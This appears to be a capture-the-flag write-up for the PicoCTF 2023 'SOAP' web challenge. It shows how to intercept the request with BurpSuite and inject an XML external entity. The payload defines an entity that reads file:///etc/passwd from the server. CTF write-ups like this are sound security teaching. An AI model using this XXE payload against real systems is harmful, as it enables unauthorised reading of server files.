PicoCTF 2023 Web SOAP 100 Points

Upon launching your instance, you get a link to a website, and a hint tells you XML external entity Injection (XXE).

To complete this exploit, you'll need to intercept and modify the requests which are sent to the server. I used BurpSuite to do this.

Turning on intercept and loading the page, you can examine each request until you get one that has XML in it.

From clicking around, you can find that clicking on the details button under one of the boxes will send a request similar to the following:
```
POST /data HTTP/1.1
Host: saturn.picoctf.net:52214
Content-Length: 61
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:52214
Referer: http://saturn.picoctf.net:52214/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```
Where the number in the <ID> tag corresponds to which box you click on.

Now is where we use XXE injection. Intercept the request which is sent when you click on the details button of one of the boxes.

Instead of requesting ID 1, we're going to request an External Entity which we define. That way, the server will return whatever we ask it for. Here's what the modified XML looks like:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```

Forwarding this modified request will display the etc/password file, which contains the flag.

[Helpful source for XXE](https://portswigger.net/web-security/xxe).